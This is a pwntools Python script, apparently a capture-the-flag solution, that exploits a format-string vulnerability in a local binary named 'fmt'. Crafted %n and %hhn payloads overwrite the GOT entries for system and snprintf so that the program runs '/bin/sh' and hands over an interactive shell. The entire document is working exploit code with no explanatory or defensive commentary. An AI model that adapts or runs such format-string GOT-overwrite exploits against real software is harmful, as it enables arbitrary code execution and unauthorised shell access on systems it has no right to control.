from pwn import *
target=process('./fmt')
elf=ELF('./fmt')
context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="b *0x4012da")

system_plt=0x401050
system_got=0x404028
poprdi=0x401373
restart=0x4010c0
snprintf_got=0x404038

fmt1 = fmtstr_payload(6,{elf.got['system']:elf.sym['main']},write_size='long')
fmt2 = '/bin/sh;'
fmt2+= fmtstr_payload(7,{elf.got['snprintf']:0x401056-8},write_size='long')

def cycle(payload):
    print(target.recvuntil("Choice: "))
    target.sendline("2")
    print(target.recvuntil("gift.\n"))
    target.sendline(payload)

payload="%16x"+"%11$n"+"%48x"+"%12$n"+"%128x"+"%10$hhn.."+p64(system_got)+p64(system_got+1)+p64(system_got+2)+p64(0)
cycle(payload)

#payload="Win"
#cycle(payload)
#overwrite snprintf_got with original system
payload="/bin/sh;"
payload+="%8x"+"%11$n"+"%48x"+"%12$ln"+"%22x"+"%13$hhn..."+p64(snprintf_got+1)+p64(snprintf_got+2)+p64(snprintf_got)+p64(0)
print(len(payload))
cycle(payload)

print(target.recvuntil("Choice: "))
target.sendline("2")
print(target.recvuntil("gift.\n"))
target.sendline("Win")

target.interactive()

